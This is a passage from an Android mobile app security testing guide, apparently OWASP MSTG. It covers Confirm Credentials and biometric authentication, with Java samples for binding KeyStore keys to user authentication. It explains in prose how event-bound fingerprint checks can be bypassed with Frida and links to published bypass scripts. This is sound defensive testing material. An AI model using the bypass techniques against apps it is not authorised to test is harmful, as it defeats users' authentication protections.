
\begin{itemize}
\tightlist
\item
  Android Key Attestation -
  \url{https://developer.android.com/training/articles/security-key-attestation}
\item
  Attestation and Assertion -
  \url{https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion}
\item
  FIDO Alliance TechNotes -
  \url{https://fidoalliance.org/fido-technotes-the-truth-about-attestation/}
\item
  FIDO Alliance Whitepaper -
  \url{https://fidoalliance.org/wp-content/uploads/Hardware-backed_Keystore_White_Paper_June2018.pdf}
\item
  Google Sample Codes -
  \url{https://github.com/googlesamples/android-key-attestation/tree/master/server}
\item
  Verifying Android Key Attestation -
  \url{https://medium.com/@herrjemand/webauthn-fido2-verifying-android-keystore-attestation-4a8835b33e9d}
\item
  W3C Android Key Attestation -
  \url{https://www.w3.org/TR/webauthn/\#android-key-attestation}
\end{itemize}

\hypertarget{owasp-masvs-7}{%
\subparagraph{OWASP MASVS}\label{owasp-masvs-7}}

\begin{itemize}
\tightlist
\item
  MSTG-STORAGE-1: ``System credential storage facilities need to be used
  to store sensitive data, such as PII, user credentials or
  cryptographic keys.''
\item
  MSTG-CRYPTO-1: ``The app does not rely on symmetric cryptography with
  hardcoded keys as a sole method of encryption.''
\item
  MSTG-CRYPTO-2: ``The app uses proven implementations of cryptographic
  primitives.''
\item
  MSTG-CRYPTO-3: ``The app uses cryptographic primitives that are
  appropriate for the particular use-case, configured with parameters
  that adhere to industry best practices.''
\item
  MSTG-CRYPTO-4: ``The app does not use cryptographic protocols or
  algorithms that are widely considered deprecated for security
  purposes.''
\item
  MSTG-CRYPTO-5: ``The app doesn't re-use the same cryptographic key for
  multiple purposes.''
\item
  MSTG-CRYPTO-6: ``All random values are generated using a sufficiently
  secure random number generator.''
\end{itemize}

\hypertarget{local-authentication-on-android}{%
\subsection{Local Authentication on
Android}\label{local-authentication-on-android}}

During local authentication, an app authenticates the user against
credentials stored locally on the device. In other words, the user
``unlocks'' the app or some inner layer of functionality by providing a
valid PIN, password or biometric characteristics such as face or
fingerprint, which is verified by referencing local data. Generally,
this is done so that users can more conveniently resume an existing
session with a remote service or as a means of step-up authentication to
protect some critical function.

As stated before in chapter
``\href{0x04e-Testing-Authentication-and-Session-Management.md}{Mobile
App Authentication Architectures}'': The tester should be aware that
local authentication should always be enforced at a remote endpoint or
based on a cryptographic primitive. Attackers can easily bypass local
authentication if no data returns from the authentication process.

In Android, there are two mechanisms supported by the Android Runtime
for local authentication: the Confirm Credential flow and the Biometric
Authentication flow.

\hypertarget{testing-confirm-credentials-mstg-auth-1-and-mstg-storage-11}{%
\subsubsection{Testing Confirm Credentials (MSTG-AUTH-1 and
MSTG-STORAGE-11)}\label{testing-confirm-credentials-mstg-auth-1-and-mstg-storage-11}}

\hypertarget{overview-19}{%
\paragraph{Overview}\label{overview-19}}

The confirm credential flow is available since Android 6.0 and is used
to ensure that users do not have to enter app-specific passwords
together with the lock screen protection. Instead: if a user has logged
in to the device recently, then confirm-credentials can be used to
unlock cryptographic materials from the \texttt{AndroidKeystore}. That
is, if the user unlocked the device within the set time limits
(\texttt{setUserAuthenticationValidityDurationSeconds}), otherwise the
device needs to be unlocked again.

Note that the security of Confirm Credentials is only as strong as the
protection set at the lock screen. This often means that simple
predictive lock-screen patterns are used and therefore we do not
recommend any apps which require L2 of security controls to use Confirm
Credentials.

\hypertarget{static-analysis-26}{%
\paragraph{Static Analysis}\label{static-analysis-26}}

Reassure that the lock screen is set:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{   KeyguardManager mKeyguardManager = (KeyguardManager) }\FunctionTok{getSystemService}\NormalTok{(}\BuiltInTok{Context}\NormalTok{.}\FunctionTok{KEYGUARD\_SERVICE}\NormalTok{);}
   \KeywordTok{if}\NormalTok{ (!mKeyguardManager.}\FunctionTok{isKeyguardSecure}\NormalTok{()) \{}
            \CommentTok{// Show a message that the user hasn\textquotesingle{}t set up a lock screen.}
\NormalTok{   \}}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  Create the key protected by the lock screen. In order to use this key,
  the user needs to have unlocked the device in the last X seconds, or
  the device needs to be unlocked again. Make sure that this timeout is
  not too long, as it becomes harder to ensure that it was the same user
  using the app as the user unlocking the device:
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
  \KeywordTok{try}\NormalTok{ \{}
        \BuiltInTok{KeyStore}\NormalTok{ keyStore = }\BuiltInTok{KeyStore}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\StringTok{"AndroidKeyStore"}\NormalTok{);}
\NormalTok{        keyStore.}\FunctionTok{load}\NormalTok{(}\KeywordTok{null}\NormalTok{);}
        \BuiltInTok{KeyGenerator}\NormalTok{ keyGenerator = }\BuiltInTok{KeyGenerator}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}
\NormalTok{                KeyProperties.}\FunctionTok{KEY\_ALGORITHM\_AES}\NormalTok{, }\StringTok{"AndroidKeyStore"}\NormalTok{);}

        \CommentTok{// Set the alias of the entry in Android KeyStore where the key will appear}
        \CommentTok{// and the constrains (purposes) in the constructor of the Builder}
\NormalTok{        keyGenerator.}\FunctionTok{init}\NormalTok{(}\KeywordTok{new}\NormalTok{ KeyGenParameterSpec.}\FunctionTok{Builder}\NormalTok{(KEY\_NAME,}
\NormalTok{                KeyProperties.}\FunctionTok{PURPOSE\_ENCRYPT}\NormalTok{ | KeyProperties.}\FunctionTok{PURPOSE\_DECRYPT}\NormalTok{)}
\NormalTok{                .}\FunctionTok{setBlockModes}\NormalTok{(KeyProperties.}\FunctionTok{BLOCK\_MODE\_CBC}\NormalTok{)}
\NormalTok{                .}\FunctionTok{setUserAuthenticationRequired}\NormalTok{(}\KeywordTok{true}\NormalTok{)}
                        \CommentTok{// Require that the user has unlocked in the last 30 seconds}
\NormalTok{                .}\FunctionTok{setUserAuthenticationValidityDurationSeconds}\NormalTok{(}\DecValTok{30}\NormalTok{)}
\NormalTok{                .}\FunctionTok{setEncryptionPaddings}\NormalTok{(KeyProperties.}\FunctionTok{ENCRYPTION\_PADDING\_PKCS7}\NormalTok{)}
\NormalTok{                .}\FunctionTok{build}\NormalTok{());}
\NormalTok{        keyGenerator.}\FunctionTok{generateKey}\NormalTok{();}
\NormalTok{    \} }\KeywordTok{catch}\NormalTok{ (}\BuiltInTok{NoSuchAlgorithmException}\NormalTok{ | }\BuiltInTok{NoSuchProviderException}
\NormalTok{            | }\BuiltInTok{InvalidAlgorithmParameterException}\NormalTok{ | }\BuiltInTok{KeyStoreException}
\NormalTok{            | }\BuiltInTok{CertificateException}\NormalTok{ | }\BuiltInTok{IOException}\NormalTok{ e) \{}
        \KeywordTok{throw} \KeywordTok{new} \BuiltInTok{RuntimeException}\NormalTok{(}\StringTok{"Failed to create a symmetric key"}\NormalTok{, e);}
\NormalTok{    \}}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  Setup the lock screen to confirm:
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
  \KeywordTok{private} \DataTypeTok{static} \DataTypeTok{final} \DataTypeTok{int}\NormalTok{ REQUEST\_CODE\_CONFIRM\_DEVICE\_CREDENTIALS = }\DecValTok{1}\NormalTok{; }\CommentTok{//used as a number to verify whether this is where the activity results from}
\NormalTok{  Intent intent = mKeyguardManager.}\FunctionTok{createConfirmDeviceCredentialIntent}\NormalTok{(}\KeywordTok{null}\NormalTok{, }\KeywordTok{null}\NormalTok{);}
        \KeywordTok{if}\NormalTok{ (intent != }\KeywordTok{null}\NormalTok{) \{}
            \FunctionTok{startActivityForResult}\NormalTok{(intent, REQUEST\_CODE\_CONFIRM\_DEVICE\_CREDENTIALS);}
\NormalTok{        \}}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  Use the key after lock screen:
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
    \AttributeTok{@Override}
    \KeywordTok{protected} \DataTypeTok{void} \FunctionTok{onActivityResult}\NormalTok{(}\DataTypeTok{int}\NormalTok{ requestCode, }\DataTypeTok{int}\NormalTok{ resultCode, Intent data) \{}
        \KeywordTok{if}\NormalTok{ (requestCode == REQUEST\_CODE\_CONFIRM\_DEVICE\_CREDENTIALS) \{}
            \CommentTok{// Challenge completed, proceed with using cipher}
            \KeywordTok{if}\NormalTok{ (resultCode == RESULT\_OK) \{}
                \CommentTok{//use the key for the actual authentication flow}
\NormalTok{            \} }\KeywordTok{else}\NormalTok{ \{}
                \CommentTok{// The user canceled or didn’t complete the lock screen}
                \CommentTok{// operation. Go to error/cancellation flow.}
\NormalTok{            \}}
\NormalTok{        \}}
\NormalTok{    \}}
\end{Highlighting}
\end{Shaded}

Make sure that the unlocked key is used during the application flow. For
example, the key may be used to decrypt local storage or a message
received from a remote endpoint. If the application simply checks
whether the user has unlocked the key or not, the application may be
vulnerable to a local authentication bypass.

\hypertarget{dynamic-analysis-23}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-23}}

Validate the duration of time (seconds) for which the key is authorized
to be used after the user is successfully authenticated. This is only
needed if \texttt{setUserAuthenticationRequired} is used.

\hypertarget{testing-biometric-authentication-mstg-auth-8}{%
\subsubsection{Testing Biometric Authentication
(MSTG-AUTH-8)}\label{testing-biometric-authentication-mstg-auth-8}}

\hypertarget{overview-20}{%
\paragraph{Overview}\label{overview-20}}

Biometric authentication is a convenient mechanism for authentication,
but also introduces an additional attack surface when using it. The
Android developer documentation gives an interesting overview and
indicators for
\href{https://source.android.com/security/biometric/measure\#strong-weak-unlocks}{measuring
biometric unlock security}.

The Android platform offers three different classes for biometric
authentication:

\begin{itemize}
\tightlist
\item
  Android Q / 10 (API level 29) and higher: \texttt{BiometricManager}
\item
  Android P / 9 (API level 28) and higher: \texttt{BiometricPrompt}
\item
  Android 6.0 (API level 23) and higher: \texttt{FingerprintManager}
  (deprecated in Android 9)
\end{itemize}

\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/190c3e989709cec2b899e4a0ad6740fff69ed529.png}\{
width=500" alt="Biometric Auth in Android\}

The class
\href{https://developer.android.com/reference/kotlin/android/hardware/biometrics/BiometricManager}{\texttt{BiometricManager}}
can be used to verify if biometric hardware is available on the device
and if it's configured by the user. If that's the case, the class
\href{https://developer.android.com/reference/kotlin/android/hardware/biometrics/BiometricPrompt}{\texttt{BiometricPrompt}}
can be used to show a system-provided biometric dialog.

The \texttt{BiometricPrompt} class is a significant improvement, as it
allows to have a consistent UI for biometric authentication on Android
and also supports more sensors than just fingerprint.

This is different to the \texttt{FingerprintManager} class which only
supports fingerprint sensors and provides no UI, forcing developers to
build their own fingerprint UI.

A very detailed overview and explanation of the Biometric API on Android
was published on the
\href{https://android-developers.googleblog.com/2019/10/one-biometric-api-over-all-android.html}{Android
Developer Blog}.

\hypertarget{fingerprintmanager-deprecated-in-android-9}{%
\subparagraph{FingerprintManager (deprecated in Android
9)}\label{fingerprintmanager-deprecated-in-android-9}}

Android 6.0 (API level 23) introduced public APIs for authenticating
users via fingerprint, but is deprecated in Android 9 (API level 28).
Access to the fingerprint hardware is provided through the
\href{https://developer.android.com/reference/android/hardware/fingerprint/}{\texttt{FingerprintManager}}
class. An app can request fingerprint authentication by instantiating a
\texttt{FingerprintManager} object and calling its \texttt{authenticate}
method. The caller registers callback methods to handle possible
outcomes of the authentication process (i.e.~success, failure, or
error). Note that this method doesn't constitute strong proof that
fingerprint authentication has actually been performed - for example,
the authentication step could be patched out by an attacker, or the
``success'' callback could be overloaded using dynamic instrumentation.

You can achieve better security by using the fingerprint API in
conjunction with the Android \texttt{KeyGenerator} class. With this
approach, a symmetric key is stored in the Android KeyStore and unlocked
with the user's fingerprint. For example, to enable user access to a
remote service, an AES key is created which encrypts the authentication
token. By calling \texttt{setUserAuthenticationRequired(true)} when
creating the key, it is ensured that the user must re-authenticate to
retrieve it. The encrypted authentication token can then be saved
directly on the the device (e.g.~via Shared Preferences). This design is
a relatively safe way to ensure the user actually entered an authorized
fingerprint.

An even more secure option is using asymmetric cryptography. Here, the
mobile app creates an asymmetric key pair in the KeyStore and enrolls
the public key on the server backend. Later transactions are then signed
with the private key and verified by the server using the public key.

\hypertarget{static-analysis-27}{%
\paragraph{Static Analysis}\label{static-analysis-27}}

Note that there are quite some vendor/third party SDKs, which provide
biometric support, but which have their own insecurities. Be very
cautious when using third party SDKs to handle sensitive authentication
logic.

The following sections explain the different biometric authentication
classes.

\hypertarget{biometric-library}{%
\subparagraph{Biometric Library}\label{biometric-library}}

Android provides a library called
\href{https://developer.android.com/jetpack/androidx/releases/biometric}{Biometric}
which offers a compatibility version of the \texttt{BiometricPrompt} and
\texttt{BiometricManager} APIs, as implemented in Android 10, with full
feature support back to Android 6.0 (API 23).

You can find a reference implementation and instructions on how to
\href{https://developer.android.com/training/sign-in/biometric-auth}{show
a biometric authentication dialog} in the Android developer
documentation.

There are two \texttt{authenticate} methods available in the
\texttt{BiometricPrompt} class. One of them expects a
\href{https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt.CryptoObject.html}{\texttt{CryptoObject}},
which adds an additional layer of security for the biometric
authentication.

The authentication flow would be as follows when using CryptoObject:

\begin{itemize}
\tightlist
\item
  The app creates a key in the KeyStore with
  \texttt{setUserAuthenticationRequired} and
  \texttt{setInvalidatedByBiometricEnrollment} set to true.
  Additionally, \texttt{setUserAuthenticationValidityDurationSeconds}
  should be set to -1.
\item
  This key is used to encrypt information that is authenticating the
  user (e.g.~session information or authentication token).
\item
  A valid set of biometrics must be presented before the key is released
  from the KeyStore to decrypt the data, which is validated through the
  \texttt{authenticate} method and the \texttt{CryptoObject}.
\item
  This solution cannot be bypassed, even on rooted devices, as the key
  from the KeyStore can only be used after successful biometric
  authentication.
\end{itemize}

If \texttt{CryptoObject} is not used as part of the authenticate method,
it can be bypassed by using Frida. See the ``Dynamic Instrumentation''
section for more details.

Developers can use several
\href{https://source.android.com/security/biometric\#validation}{validation
classes} offered by Android to test the implementation of biometric
authentication in their app.

\hypertarget{fingerprintmanager}{%
\subparagraph{FingerprintManager}\label{fingerprintmanager}}

\begin{quote}
This section describes how to implement biometric authentication by
using the \texttt{FingerprintManager} class. Please keep in mind that
this class is deprecated and the
\href{https://developer.android.com/jetpack/androidx/releases/biometric}{Biometric
library} should be used instead as a best practice. This section is just
for reference, in case you come across such an implementation and need
to analyse it.
\end{quote}

Begin by searching for \texttt{FingerprintManager.authenticate} calls.
The first parameter passed to this method should be a
\texttt{CryptoObject} instance which is a
\href{https://developer.android.com/reference/android/hardware/fingerprint/FingerprintManager.CryptoObject.html}{wrapper
class for crypto objects} supported by FingerprintManager. Should the
parameter be set to \texttt{null}, this means the fingerprint
authorization is purely event-bound, likely creating a security issue.

The creation of the key used to initialize the cipher wrapper can be
traced back to the \texttt{CryptoObject}. Verify the key was both
created using the \texttt{KeyGenerator} class in addition to
\texttt{setUserAuthenticationRequired(true)} being called during
creation of the \texttt{KeyGenParameterSpec} object (see code samples
below).

Make sure to verify the authentication logic. For the authentication to
be successful, the remote endpoint \textbf{must} require the client to
present the secret retrieved from the KeyStore, a value derived from the
secret, or a value signed with the client private key (see above).

Safely implementing fingerprint authentication requires following a few
simple principles, starting by first checking if that type of
authentication is even available. On the most basic front, the device
must run Android 6.0 or higher (API 23+). Four other prerequisites must
also be verified:

\begin{itemize}
\item
  The permission must be requested in the Android Manifest:

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{<uses{-}permission}
\OtherTok{        android:name=}\StringTok{"android.permission.USE\_FINGERPRINT"} \KeywordTok{/>}
\end{Highlighting}
\end{Shaded}
\item
  Fingerprint hardware must be available:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    FingerprintManager fingerprintManager = (FingerprintManager)}
\NormalTok{                    context.}\FunctionTok{getSystemService}\NormalTok{(}\BuiltInTok{Context}\NormalTok{.}\FunctionTok{FINGERPRINT\_SERVICE}\NormalTok{);}
\NormalTok{    fingerprintManager.}\FunctionTok{isHardwareDetected}\NormalTok{();}
\end{Highlighting}
\end{Shaded}
\item
  The user must have a protected lock screen:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    KeyguardManager keyguardManager = (KeyguardManager) context.}\FunctionTok{getSystemService}\NormalTok{(}\BuiltInTok{Context}\NormalTok{.}\FunctionTok{KEYGUARD\_SERVICE}\NormalTok{);}
\NormalTok{    keyguardManager.}\FunctionTok{isKeyguardSecure}\NormalTok{();  }\CommentTok{//note if this is not the case: ask the user to setup a protected lock screen}
\end{Highlighting}
\end{Shaded}
\item
  At least one finger should be registered:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    fingerprintManager.}\FunctionTok{hasEnrolledFingerprints}\NormalTok{();}
\end{Highlighting}
\end{Shaded}
\item
  The application should have permission to ask for a user fingerprint:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    context.}\FunctionTok{checkSelfPermission}\NormalTok{(}\BuiltInTok{Manifest}\NormalTok{.}\FunctionTok{permission}\NormalTok{.}\FunctionTok{USE\_FINGERPRINT}\NormalTok{) == PermissionResult.}\FunctionTok{PERMISSION\_GRANTED}\NormalTok{;}
\end{Highlighting}
\end{Shaded}
\end{itemize}

If any of the above checks fail, the option for fingerprint
authentication should not be offered.

It is important to remember that not every Android device offers
hardware-backed key storage. The \texttt{KeyInfo} class can be used to
find out whether the key resides inside secure hardware such as a
Trusted Execution Environment (TEE) or Secure Element (SE).

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{SecretKeyFactory}\NormalTok{ factory = }\BuiltInTok{SecretKeyFactory}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\FunctionTok{getEncryptionKey}\NormalTok{().}\FunctionTok{getAlgorithm}\NormalTok{(), ANDROID\_KEYSTORE);}
                \BuiltInTok{KeyInfo}\NormalTok{ secetkeyInfo = (}\BuiltInTok{KeyInfo}\NormalTok{) factory.}\FunctionTok{getKeySpec}\NormalTok{(yourencryptionkeyhere, }\BuiltInTok{KeyInfo}\NormalTok{.}\FunctionTok{class}\NormalTok{);}
\NormalTok{secetkeyInfo.}\FunctionTok{isInsideSecureHardware}\NormalTok{()}
\end{Highlighting}
\end{Shaded}

On certain systems, it is possible to enforce the policy for biometric
authentication through hardware as well. This is checked by:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    keyInfo.}\FunctionTok{isUserAuthenticationRequirementEnforcedBySecureHardware}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

The following describes how to do fingerprint authentication using a
symmetric key pair.

Fingerprint authentication may be implemented by creating a new AES key
using the \texttt{KeyGenerator} class by adding
\texttt{setUserAuthenticationRequired(true)} in
\texttt{KeyGenParameterSpec.Builder}.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    generator = }\BuiltInTok{KeyGenerator}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(KeyProperties.}\FunctionTok{KEY\_ALGORITHM\_AES}\NormalTok{, KEYSTORE);}

\NormalTok{    generator.}\FunctionTok{init}\NormalTok{(}\KeywordTok{new}\NormalTok{ KeyGenParameterSpec.}\FunctionTok{Builder}\NormalTok{ (KEY\_ALIAS,}
\NormalTok{            KeyProperties.}\FunctionTok{PURPOSE\_ENCRYPT}\NormalTok{ | KeyProperties.}\FunctionTok{PURPOSE\_DECRYPT}\NormalTok{)}
\NormalTok{            .}\FunctionTok{setBlockModes}\NormalTok{(KeyProperties.}\FunctionTok{BLOCK\_MODE\_CBC}\NormalTok{)}
\NormalTok{            .}\FunctionTok{setEncryptionPaddings}\NormalTok{(KeyProperties.}\FunctionTok{ENCRYPTION\_PADDING\_PKCS7}\NormalTok{)}
\NormalTok{            .}\FunctionTok{setUserAuthenticationRequired}\NormalTok{(}\KeywordTok{true}\NormalTok{)}
\NormalTok{            .}\FunctionTok{build}\NormalTok{()}
\NormalTok{    );}

\NormalTok{    generator.}\FunctionTok{generateKey}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

To perform encryption or decryption with the protected key, create a
\texttt{Cipher} object and initialize it with the key alias.

\begin{Shaded}
\begin{Highlighting}[]
    \BuiltInTok{SecretKey}\NormalTok{ keyspec = (}\BuiltInTok{SecretKey}\NormalTok{)keyStore.}\FunctionTok{getKey}\NormalTok{(KEY\_ALIAS, }\KeywordTok{null}\NormalTok{);}

    \KeywordTok{if}\NormalTok{ (mode == }\BuiltInTok{Cipher}\NormalTok{.}\FunctionTok{ENCRYPT\_MODE}\NormalTok{) \{}
\NormalTok{        cipher.}\FunctionTok{init}\NormalTok{(mode, keyspec);}
\end{Highlighting}
\end{Shaded}

Keep in mind, a new key cannot be used immediately - it has to be
authenticated through the \texttt{FingerprintManager} first. This
involves wrapping the \texttt{Cipher} object into
\texttt{FingerprintManager.CryptoObject} which is passed to
\texttt{FingerprintManager.authenticate} before it will be recognized.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    cryptoObject = }\KeywordTok{new}\NormalTok{ FingerprintManager.}\FunctionTok{CryptoObject}\NormalTok{(cipher);}
\NormalTok{    fingerprintManager.}\FunctionTok{authenticate}\NormalTok{(cryptoObject, }\KeywordTok{new} \FunctionTok{CancellationSignal}\NormalTok{(), }\DecValTok{0}\NormalTok{, }\KeywordTok{this}\NormalTok{, }\KeywordTok{null}\NormalTok{);}
\end{Highlighting}
\end{Shaded}

When the authentication succeeds, the callback method
\texttt{onAuthenticationSucceeded(FingerprintManager.AuthenticationResult\ result)}
is called at which point, the authenticated \texttt{CryptoObject} can be
retrieved from the result.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \DataTypeTok{void} \FunctionTok{authenticationSucceeded}\NormalTok{(FingerprintManager.}\FunctionTok{AuthenticationResult}\NormalTok{ result) \{}
\NormalTok{    cipher = result.}\FunctionTok{getCryptoObject}\NormalTok{().}\FunctionTok{getCipher}\NormalTok{();}

    \CommentTok{//(... do something with the authenticated cipher object ...)}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

The following describes how to do fingerprint authentication using an
asymmetric key pair.

To implement fingerprint authentication using asymmetric cryptography,
first create a signing key using the \texttt{KeyPairGenerator} class,
and enroll the public key with the server. You can then authenticate
pieces of data by signing them on the client and verifying the signature
on the server. A detailed example for authenticating to remote servers
using the fingerprint API can be found in the
\href{https://android-developers.googleblog.com/2015/10/new-in-android-samples-authenticating.html}{Android
Developers Blog}.

A key pair is generated as follows:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{KeyPairGenerator}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(KeyProperties.}\FunctionTok{KEY\_ALGORITHM\_EC}\NormalTok{, }\StringTok{"AndroidKeyStore"}\NormalTok{);}
\NormalTok{keyPairGenerator.}\FunctionTok{initialize}\NormalTok{(}
        \KeywordTok{new}\NormalTok{ KeyGenParameterSpec.}\FunctionTok{Builder}\NormalTok{(MY\_KEY,}
\NormalTok{                KeyProperties.}\FunctionTok{PURPOSE\_SIGN}\NormalTok{)}
\NormalTok{                .}\FunctionTok{setDigests}\NormalTok{(KeyProperties.}\FunctionTok{DIGEST\_SHA256}\NormalTok{)}
\NormalTok{                .}\FunctionTok{setAlgorithmParameterSpec}\NormalTok{(}\KeywordTok{new} \BuiltInTok{ECGenParameterSpec}\NormalTok{(}\StringTok{"secp256r1"}\NormalTok{))}
\NormalTok{                .}\FunctionTok{setUserAuthenticationRequired}\NormalTok{(}\KeywordTok{true}\NormalTok{)}
\NormalTok{                .}\FunctionTok{build}\NormalTok{());}
\NormalTok{keyPairGenerator.}\FunctionTok{generateKeyPair}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

To use the key for signing, you need to instantiate a CryptoObject and
authenticate it through \texttt{FingerprintManager}.

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{Signature}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\StringTok{"SHA256withECDSA"}\NormalTok{);}
\BuiltInTok{KeyStore}\NormalTok{ keyStore = }\BuiltInTok{KeyStore}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\StringTok{"AndroidKeyStore"}\NormalTok{);}
\NormalTok{keyStore.}\FunctionTok{load}\NormalTok{(}\KeywordTok{null}\NormalTok{);}
\BuiltInTok{PrivateKey}\NormalTok{ key = (}\BuiltInTok{PrivateKey}\NormalTok{) keyStore.}\FunctionTok{getKey}\NormalTok{(MY\_KEY, }\KeywordTok{null}\NormalTok{);}
\NormalTok{signature.}\FunctionTok{initSign}\NormalTok{(key);}
\NormalTok{CryptoObject cryptoObject = }\KeywordTok{new}\NormalTok{ FingerprintManager.}\FunctionTok{CryptoObject}\NormalTok{(signature);}

\NormalTok{CancellationSignal cancellationSignal = }\KeywordTok{new} \FunctionTok{CancellationSignal}\NormalTok{();}
\NormalTok{FingerprintManager fingerprintManager =}
\NormalTok{        context.}\FunctionTok{getSystemService}\NormalTok{(FingerprintManager.}\FunctionTok{class}\NormalTok{);}
\NormalTok{fingerprintManager.}\FunctionTok{authenticate}\NormalTok{(cryptoObject, cancellationSignal, }\DecValTok{0}\NormalTok{, }\KeywordTok{this}\NormalTok{, }\KeywordTok{null}\NormalTok{);}
\end{Highlighting}
\end{Shaded}

You can now sign the contents of a byte array \texttt{inputBytes} as
follows.

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{Signature}\NormalTok{ signature = cryptoObject.}\FunctionTok{getSignature}\NormalTok{();}
\NormalTok{signature.}\FunctionTok{update}\NormalTok{(inputBytes);}
\DataTypeTok{byte}\NormalTok{[] signed = signature.}\FunctionTok{sign}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  Note that in cases where transactions are signed, a random nonce
  should be generated and added to the signed data. Otherwise, an
  attacker could replay the transaction.
\item
  To implement authentication using symmetric fingerprint
  authentication, use a challenge-response protocol.
\end{itemize}

\hypertarget{additional-security-features}{%
\subparagraph{Additional Security
Features}\label{additional-security-features}}

Android 7.0 (API level 24) adds the
\texttt{setInvalidatedByBiometricEnrollment(boolean\ invalidateKey)}
method to \texttt{KeyGenParameterSpec.Builder}. When
\texttt{invalidateKey} value is set to \texttt{true} (the default), keys
that are valid for fingerprint authentication are irreversibly
invalidated when a new fingerprint is enrolled. This prevents an
attacker from retrieving they key even if they are able to enroll an
additional fingerprint.

Android 8.0 (API level 26) adds two additional error codes:

\begin{itemize}
\tightlist
\item
  \texttt{FINGERPRINT\_ERROR\_LOCKOUT\_PERMANENT}: The user has tried
  too many times to unlock their device using the fingerprint reader.
\item
  \texttt{FINGERPRINT\_ERROR\_VENDOR} -- A vendor-specific fingerprint
  reader error occurred.
\end{itemize}

\hypertarget{third-party-sdks}{%
\subparagraph{Third party SDKs}\label{third-party-sdks}}

Make sure that fingerprint authentication and/or other types of
biometric authentication are exclusively based on the Android SDK and
its APIs. If this is not the case, ensure that the alternative SDK has
been properly vetted for any weaknesses. Make sure that the SDK is
backed by the TEE/SE which unlocks a (cryptographic) secret based on the
biometric authentication. This secret should not be unlocked by anything
else, but a valid biometric entry. That way, it should never be the case
that the fingerprint logic can be bypassed.

\hypertarget{dynamic-analysis-24}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-24}}

F-Secure Labs has published a very detailed
\href{https://labs.f-secure.com/blog/how-secure-is-your-android-keystore-authentication}{blog
article about the Android KeyStore and Biometric authentication}.

As part of this research two Frida scripts were released, which can be
used to test insecure implementations of biometric authentication and
try to bypass them:

\begin{itemize}
\tightlist
\item
  \href{https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/fingerprint-bypass.js}{Fingerprint
  bypass}: This Frida script will bypass authentication when the
  \texttt{CryptoObject} is not used in the \texttt{authenticate} method
  of the \texttt{BiometricPrompt} class. The authentication
  implementation relies on the callback
  \texttt{onAuthenticationSucceded} being called.
\item
  \href{https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/fingerprint-bypass-via-exception-handling.js}{Fingerprint
  bypass via exception handling}: This Frida script will attempt to
  bypass authentication when the \texttt{CryptoObject} is used, but used
  in an incorrect way. The detailed explanation can be found in the
  section ``Crypto Object Exception Handling'' in the blog post.
\end{itemize}

\hypertarget{references-11}{%
\subsubsection{References}\label{references-11}}

\hypertarget{owasp-masvs-8}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-8}}

\begin{itemize}
\tightlist
\item
  MSTG-AUTH-1: ``If the app provides users access to a remote service,
  some form of authentication, such as username/password authentication,
  is performed at the remote endpoint.''
\item
  MSTG-AUTH-8: ``Biometric authentication, if any, is not event-bound
  (i.e.~using an API that simply returns''true" or ``false''). Instead,
  it is based on unlocking the keychain/keystore."
\item
  MSTG-STORAGE-11: ``The app enforces a minimum device-access-security
  policy, such as requiring the user to set a device passcode.''
\end{itemize}

\hypertarget{request-app-permissions}{%
\paragraph{Request App Permissions}\label{request-app-permissions}}

\begin{itemize}
\tightlist
\item
  Runtime Permissions -
  \url{https://developer.android.com/training/permissions/requesting}
\end{itemize}

\hypertarget{android-network-apis}{%
\subsection{Android Network APIs}\label{android-network-apis}}

\hypertarget{testing-endpoint-identify-verification-mstg-network-3}{%
\subsubsection{Testing Endpoint Identify Verification
(MSTG-NETWORK-3)}\label{testing-endpoint-identify-verification-mstg-network-3}}

Using TLS to transport sensitive information over the network is
essential for security. However, encrypting communication between a
mobile application and its backend API is not trivial. Developers often
decide on simpler but less secure solutions (e.g., those that accept any
certificate) to facilitate the development process, and sometimes these
weak solutions
\href{https://saschafahl.de/static/paper/androidssl2012.pdf}{make it
into the production version}, potentially exposing users to
\href{https://cwe.mitre.org/data/definitions/295.html}{man-in-the-middle
attacks}.

Two key issues should be addressed:

\begin{itemize}
\tightlist
\item
  Verify that a certificate comes from a trusted source, i.e.~a trusted
  CA (Certificate Authority).
\item
  Determine whether the endpoint server presents the right certificate.
